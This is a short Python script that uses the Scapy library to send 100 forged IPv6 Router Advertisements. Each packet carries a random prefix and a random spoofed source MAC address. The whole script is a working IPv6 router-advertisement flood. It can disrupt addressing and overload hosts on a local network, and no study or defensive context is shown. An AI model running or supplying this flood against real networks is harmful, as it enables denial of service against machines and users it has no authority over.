from scapy.all import *

pkt = Ether() \
	/IPv6() \
	/ICMPv6ND_RA() \
	/ICMPv6NDOptPrefixInfo(prefix=RandIP6(),prefixlen=64) \
	/ICMPv6NDOptSrcLLAddr(lladdr=RandMAC("00:00:0c"))

sendp (pkt, count=100)
